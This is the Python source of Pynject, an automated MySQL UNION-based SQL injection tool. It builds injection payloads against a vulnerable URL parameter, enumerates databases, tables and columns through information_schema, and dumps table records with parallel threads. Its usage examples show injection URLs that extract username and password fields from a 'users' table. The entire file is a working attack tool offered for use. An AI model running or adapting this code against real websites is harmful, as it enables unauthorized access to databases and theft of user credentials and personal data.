#!/usr/bin/env python3.1
# This file is part of Pynject.
#
# Copyright(c) 2010-2011 Simone Margaritelli
# evilsocket@gmail.com
# http://www.evilsocket.net
#
# This file may be licensed under the terms of of the
# GNU General Public License Version 2 (the ``GPL'').
#
# Software distributed under the License is distributed
# on an ``AS IS'' basis, WITHOUT WARRANTY OF ANY KIND, either
# express or implied. See the GPL for the specific language
# governing rights and limitations.
#
# You should have received a copy of the GPL along with this
# program. If not, go to http://www.gnu.org/licenses/gpl.html
# or write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.

import sys, os, time, random, re, threading, urllib.request, urllib.error
from optparse import OptionParser, OptionGroup 
from urllib.parse import urlencode 

# This class is a modified version of ProgressBar from BJ Dierkes <wdierkes@5dollarwhitebox.org>
# Thanks BJ :)
class ProgressBar:
    def __init__( self, min_value = 0, max_value = 100, width = 77, char = '#' ):
        self.char   = char
        self.bar    = ''
        self.min    = min_value
        self.max    = max_value if max_value != None else 0
        self.span   = self.max - self.min
        self.width  = width
        self.amount = 0
        self.update_amount(0) 
 
    def increment_amount(self, add_amount = 1):
        new_amount = self.amount + add_amount
        if new_amount < self.min: new_amount = self.min
        if new_amount > self.max: new_amount = self.max
        self.amount = new_amount
        self.build_bar()
 
    def update_amount(self, new_amount = None):
        if not new_amount: new_amount = self.amount
        if new_amount < self.min: new_amount = self.min
        if new_amount > self.max: new_amount = self.max
        self.amount = new_amount
        self.build_bar()
 
    def build_bar(self):
        diff = float(self.amount - self.min)
        percent_done = int(round((diff / float(self.span)) * 100.0)) if self.max != 0 else 100
 
        # figure the proper number of 'character' make up the bar 
        all_full = self.width - 2
        num_hashes = int(round((percent_done * all_full) / 100))
 
        self.bar = self.char * num_hashes + ' ' * (all_full-num_hashes)
 
        percent_str = str(percent_done) + "%"
        self.bar = '[ ' + self.bar + ' ] ' + percent_str
 
    def __str__(self):
        return str(self.bar)
    
class RunningException(Exception):
    pass

class ThreadPool(threading.Thread):
    def __init__( self, window_size, prototype, async=False ):
        """Initialize the thread pool object.
        
            windows_size (int) : How many parallel threads can run.
            prototype (class)  : Subclass of threading.Thread, the class to run.
            async (bool)       : Set to true to run the pool asynchronously.
        """
        threading.Thread.__init__(self)
        self.window    = window_size
        self.prototype = prototype
        self.left      = 0
        self.running   = 0
        self.active    = False
        self.pool      = []
        self.slice     = None
        self.async     = async

    def __str__(self):
        return "Thread Pool( Prototype={0}, Window Size={1}, Asynchronous={2}, Running={3} )".format( self.prototype, self.window, self.async, self.running )

    def pushArgs( self, *args ):
        """Add to the queue a new instance of thread to run with give arguments."""
        if self.active == True:
            raise RunningException("Thread pool already running")
        else:
            self.pool.append( self.prototype(*args) )

    def run(self):
        self.__start_threads()

    def start(self):
        """Start the pool."""
        if self.active == True:
            raise RunningException("Thread pool already running")
        
        if self.async == True:
            super(ThreadPool,self).start()
        else:
            self.__start_threads()
        
    def stop(self):
        """Stop the pool."""
        if self.active == False:
            raise RunningException("Thread pool is not running")
        else:
            self.active = False

    def __start_threads(self):
        self.active = True
        self.left   = len(self.pool)
        while self.left and self.active == True:
            self.slice   = self.pool[:self.window]
            self.running = 0
                
            for thread in self.slice:
                thread.start()
                self.running += 1
            for thread in self.slice:
                if self.active == False:
                    self.running = 0
                    break
                    
                thread.join()
                self.pool.remove(thread)
                self.running -= 1
            self.left -= 1
        self.active = False

class FetchThread(threading.Thread):
    def __init__( self, injector, container, what, table, where, index, xtype, nstrings ):
        threading.Thread.__init__(self)
        self.injector  = injector
        self.container = container
        self.what      = what
        self.table     = table
        self.where     = where
        self.index     = index
        self.xtype     = xtype
        self.nstrings  = nstrings

    def run(self):
        try:
            output = self.injector.sqlInject( self.what, self.table, self.where, self.index, self.xtype, self.nstrings )
            self.container[self.index] = output
        except Exception as e:
            print( "! Exception in thread n°{0} : {1}".format( self.index, e ) )
        
class Pynject:
    def __init__( self, url, marker, comment, max_threads = 30, verbose = False ):
        self.url     = url
        self.marker  = marker
        self.comment = comment
        self.window  = max_threads
        self.verbose = verbose
        self.dbs     = []
        self.tables  = {}
        self.columns = {}
        self.records = {}
        self.banner()
        
    def banner(self):
        print( "\n\tpynject 1.0 - An automatic MySQL injector and data dumper tool.\n" +
               "\tCopyleft Simone Margaritelli <evilsocket@gmail.com>\n" +
               "\thttp://www.evilsocket.net\n\n" );

    def fetchDatabases( self ):
        print( "@ Fetching number of dbs ." )
            
        dbnumber = self.sqlInject( what = "COUNT(schema_name)", table = "information_schema.schemata", where = None, index = None, xtype = "int" )

        if dbnumber == None:
            raise Exception( "Could not fetch number of databases from information_schema." )

        print( "@ Found " + str(dbnumber) + " databases, fetching their names." )

        for dbn in range(0,dbnumber):
            dbname = self.sqlInject( what = "schema_name", table = "information_schema.schemata", where = None, index = dbn, xtype = "string" )
            if dbname == None:
                raise Exception( "Could not fetch database name." )
            else:
                if self.verbose:
                    print( "\t[{0}] {1}".format(dbn,dbname) )
                self.dbs.append(dbname)

    def fetchTables( self, db ):
        print( "@ Fetching number of tables for db '{0}' .".format(db) )
            
        tbnumber = self.sqlInject( what = "COUNT(table_name)", table = "information_schema.tables", where = "table_schema=" + self.__stringToChrSeq(db), index = None, xtype = "int" )
        pbar     = ProgressBar( 0, tbnumber )
        
        if tbnumber == None:
            raise Exception( "Could not fetch number of tables." )

        print( "@ Found {0} tables, fetching their names: {1}".format(tbnumber,pbar), end = '\r' )
        sys.stdout.flush()

        pool = ThreadPool( window_size = self.window if self.window < tbnumber else tbnumber, prototype = FetchThread, async = True )

        self.tables[db] = [None] * tbnumber

        for tbn in range(0,tbnumber):
            pool.pushArgs( self,
                           self.tables[db],
                           "table_name",
                           "information_schema.tables",
                           "table_schema=" + self.__stringToChrSeq(db),
                           tbn,
                           "string",
                           None )

        pool.start()

        self.__waitForPool( pool, tbnumber, pbar, "@ Found {0} tables, fetching their names:".format(tbnumber) )

        if self.verbose:
            for index, table in enumerate(self.tables[db]):
               print( "\t[{0}] {1}".format(index,table) )
            print("\n")
        
    def fetchColumns( self, db, table ):
        print( "@ Fetching number of columns for db '{0}' and table '{1}'.".format(db,table) )
            
        clnumber = self.sqlInject( what = "COUNT(column_name)",
                                   table = "information_schema.columns",
                                   where = "table_schema={0}%20AND%20table_name={1}".format( self.__stringToChrSeq(db), self.__stringToChrSeq(table) ),
                                   index = None,
                                   xtype = "int" )
        pbar     = ProgressBar( 0, clnumber )

        if clnumber == None:
            raise Exception( "Could not fetch number of columns." )

        print( "@ Found {0} columns, fetching their names: {1}".format( clnumber, pbar ), end = '\r' )
        sys.stdout.flush()

        pool = ThreadPool( window_size = self.window if self.window < clnumber else clnumber, prototype = FetchThread, async = True )

        self.columns[table] = [None] * clnumber

        for cln in range(0,clnumber):
            pool.pushArgs( self,
                           self.columns[table],
                           "column_name",
                           "information_schema.columns",
                           "table_schema={0}%20AND%20table_name={1}".format( self.__stringToChrSeq(db), self.__stringToChrSeq(table) ),
                           cln,
                           "string",
                           None )

        pool.start()

        self.__waitForPool( pool, clnumber, pbar, "@ Found {0} columns, fetching their names:".format(clnumber) )

        if self.verbose:
            for index, column in enumerate(self.columns[table]):
               print( "\t[{0}] {1}".format(index,column) )
            print("\n")
        
    def fetchRecords( self, db, table, columns, start=0, end=-1 ):
        print( "@ Fetching number of records for db '{0}' and table '{1}'.".format(db,table) )

        if end == -1:
            rcnumber = self.sqlInject( what = "COUNT(" + columns[0] + ")", table = db + "." + table, where = None, index = None, xtype = "int" )
        else:
            rcnumber = end - start
            
        pbar     = ProgressBar( 0, rcnumber )
        
        if rcnumber == None:
            raise Exception( "Could not fetch number of records." )

        print( "@ Found {0} records, fetching them: {1}".format( rcnumber, pbar ), end = '\r' )
        sys.stdout.flush()

        pool = ThreadPool( window_size = self.window if self.window < rcnumber else rcnumber, prototype = FetchThread, async = True )
        
        self.records[table] = [None] * rcnumber

        for rcn in range(start,end):
            pool.pushArgs( self, self.records[table], columns, db + "." + table, None, rcn - start, "strings", len(columns) )

        pool.start()

        self.__waitForPool( pool, rcnumber, pbar, "@ Found {0} records, fetching them:".format(rcnumber) )

        if self.verbose:
            for index, record in enumerate(self.records[table]):
               print( "\t[{0}] {1}".format(index,record) )
            print("\n")
        
    def fetchWholeStructure( self ):
        self.fetchDatabases()
        # Remove system db
        self.dbs.remove("information_schema")
        for db in self.dbs:
            self.fetchTables(db)
            for table in self.tables[db]:
                self.fetchColumns( db, table )

        print( "\n" )

        for db in self.dbs:
            print( "\nDATABASE {0} :".format(db) )
            for table in self.tables[db]:
                print( "\t{0} : {1}".format( table, ', '.join( self.columns[table] ) ) )
                   
    def sqlInject( self, what, table, where, index, xtype = 'string', nstrings = None ):
        token    = self.__randString(5)
        chrseq   = self.__stringToChrSeq(token)
        query    = self.__composeQuery( chrseq, what, table, where, index )
        data     = self.__httpGet(query)
        # handle return type parsing
        if xtype == 'int':
            return self.__xtractInteger( data, token )
        elif xtype == 'string':
            return self.__xtractString( data, token )
        elif xtype == 'strings':
            return self.__xtractMultipleStrings( data, token, nstrings )

    def __waitForPool( self, pool, target, pbar, prompt ):
        while pool.active == True:
            pbar.update_amount( target - len(pool.pool) )
            print( "{0} {1}".format( prompt, pbar ), end = '\r' )
            sys.stdout.flush()
            time.sleep(0.0001)
        pbar.update_amount( target )
        print( "{0} {1}".format( prompt, pbar ), end = '\r' )
        sys.stdout.flush()
        print("\n")

    def __composeQuery( self, chrseq, what, table = None, where = None, index = None ):
        # handle a single column (str) or multiple columns (list)
        if type(what) == str:
            query = self.url.replace( self.marker, "CONCAT({0},{1},{0})".format(chrseq,what) )
        elif type(what) == list:
            query = self.url.replace( self.marker, "CONCAT({0},{1},{0})".format(chrseq, ("," + chrseq + ",").join(what) ) )
        # FROM clause
        if table != None:
            query = query.replace( self.comment, "%20FROM%20{0}{1}".format(table,self.comment) )
        # WHERE clause
        if where != None:
            query = query.replace( self.comment, "%20WHERE%20{0}{1}".format(where,self.comment) )
        # LIMIT clause
        if index != None:
            query = query.replace( self.comment, "%20LIMIT%20{0},1{1}".format(index,self.comment) )

        return query

    def __randString(self,length):
        charset = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890"
        string  = ""
        for i in range(0,length):
            string += random.choice(charset)
        return string

    def __stringToChrSeq(self,string):
        seq = []
        for c in string:
            seq.append( str( ord(c) ) )
        return "CHAR(" + ','.join(seq) + ")"

    def __httpGet(self,url):
        # TODO: Handle useragent, proxy, ecc ecc
        return urllib.request.urlopen(url).read().decode('iso-8859-1')

    def __xtractInteger( self, data, token ):
        regx  = re.compile( "{0}(\d+){0}".format(token) )
        match = regx.search(data)
        return int( match.group().replace( token, '' ) ) if match is not None else None

    def __xtractString( self, data, token ):
        regx  = re.compile( "{0}(.+){0}".format(token) )
        match = regx.search(data)
        return match.group().replace( token, '' ) if match is not None else None   

    def __xtractMultipleStrings( self, data, token, n ):
        pattern = "{0}(.+)" * n + "{0}"
        regx    = re.compile( pattern.format(token) )
        match   = regx.search(data)
        if match:
            # Remove head and tail tokens
            data = match.group()
            data = data[len(token):]
            data = data[0:len(data) - len(token)]
            
            return data.split(token)
        else:
            return None

class Report:
    def __init__( self, container, options ):
        self.container = container
        self.options   = options

    def show( self ):
        if self.options.omethod == "print":
            if self.options.action == "dbs":
                for db in self.container.dbs:
                    print( "\t" + db )
            elif self.options.action == "tables":
                dbs    = self.container.tables.keys()
                for db in dbs:
                    print( "\tDATABASE " + db + " :" )
                    for table in self.container.tables[db]:
                        print( "\t\t" + table )
            elif self.options.action == "columns":
                tables = self.container.columns.keys()
                for table in tables:
                    print( "\tTABLE " + table + " :" )
                    for column in self.container.columns[table]:
                        print( "\t\t" + column )
            elif self.options.action == "records":
                tables = self.container.records.keys()
                for table in tables:
                    print( "\tTABLE " + table + " :" )
                    for record in self.container.records[table]:
                        print( "\t\t{0}".format( ", ".join(record) ) )
     
if __name__ == '__main__':
    try:
        parser = OptionParser( usage = "usage: %prog [options] [action] [output method]\n\n" +
                                       "EXAMPLES:\n" +
                                       "\t%prog -u 'http://www.site.com/news.php?id=1%20AND%201=2%20UNION%20ALL%20SELECT%20NULL,####,NULL,NULL--' -m '####' --dbs\n" +
                                       "\t%prog -u 'http://www.site.com/news.php?id=1%20AND%201=2%20UNION%20ALL%20SELECT%20NULL,####,NULL,NULL--' -m '####' -D shop --tables\n" +
                                       "\t%prog -u 'http://www.site.com/news.php?id=1%20AND%201=2%20UNION%20ALL%20SELECT%20NULL,####,NULL,NULL--' -m '####' -D shop -T users --columns\n" +
                                       "\t%prog -u 'http://www.site.com/news.php?id=1%20AND%201=2%20UNION%20ALL%20SELECT%20NULL,####,NULL,NULL--' -m '####' -D shop -T users -F 'username,password' --records --start 0 --end 100\n" )

        parser.add_option( "-u", "--url",      action="store",       dest="url",      default=None,    help="The full url with a visible union injection.")
        parser.add_option( "-m", "--marker",   action="store",       dest="marker",   default=None,    help="Marker used in the url to identify visible item.")
        parser.add_option( "-c", "--comment",  action="store",       dest="comment",  default="--",    help="String used as comment to end the query.")
        parser.add_option( "-v", "--verbose",  action="store_true",  dest="verbose",  default=False,   help="Make Pynject prints fetched data at runtime.")
        parser.add_option( "-s", "--start",    action="store",       dest="start",    default=0,       help="If fetching records, start from this index.")
        parser.add_option( "-e", "--end",      action="store",       dest="end",      default=-1,      help="If fetching records, end at this index.")
        parser.add_option( "-D", "--database", action="store",       dest="database", default=None,    help="Database name to use.")
        parser.add_option( "-T", "--table",    action="store",       dest="table",    default=None,    help="Table name to use.")
        parser.add_option( "-F", "--fields",   action="store",       dest="fields",   default=None,    help="Comma separated values of fields to use.")

        actions = OptionGroup( parser, "Actions" )
        actions.add_option( "--dbs",     action="store_const", const="dbs",     dest="action", help="Enumerates the list of databases." )
        actions.add_option( "--tables",  action="store_const", const="tables",  dest="action", help="Enumerates the list of tables, requires -D." )
        actions.add_option( "--columns", action="store_const", const="columns", dest="action", help="Enumerates the list of columns, requires -D and -T." )
        actions.add_option( "--records", action="store_const", const="records", dest="action", help="Fetch the records from a table, requires -D, -T and -F." )
        actions.add_option( "--struct",  action="store_const", const="struct",  dest="action", help="Dumps the whole structure of the database." )

        omethods = OptionGroup( parser, "Output Methods" )
        omethods.add_option( "-p", "--print", action="store", dest="omethod", default="print", help="Simply print data on the console (DEFAULT).")

        parser.add_option_group(actions)
        parser.add_option_group(omethods)
        
        (o,args) = parser.parse_args()

        if o.url == None:
            parser.error( "No url specified." )
        elif o.marker == None:
            parser.error( "No marker specified." )
        elif o.url.find(o.marker) == -1:
            parser.error( "Invalid marker, not found in given url." )
        elif o.action == None:
            parser.error( "No action specified." )
        elif o.action == "tables" and o.database == None:
            parser.error( "No database specified." )
        elif o.action == "columns" and (o.database == None or o.table == None):
            parser.error( "No database or table specified." )
        elif o.action == "records" and (o.database == None or o.table == None or o.fields == None):
            parser.error( "No database, table or fields specified." )
        elif o.end != -1 and o.end < o.start:
            parser.error( "End index can't be smaller than start index." )

        pynject = Pynject( url = o.url, marker = o.marker, comment = o.comment, verbose = o.verbose )

        if o.action == "dbs":
            pynject.fetchDatabases()
        elif o.action == "tables":
            pynject.fetchTables( o.database )
        elif o.action == "columns":
            pynject.fetchColumns( o.database, o.table )
        elif o.action == "records":
            pynject.fetchRecords( o.database, o.table, o.fields.split(","), int(o.start), int(o.end) )
        elif o.action == "struct":
            pynject.fetchWholeStructure()

        report = Report( pynject, o )
        report.show()        
    except Exception as e:
        print( e )

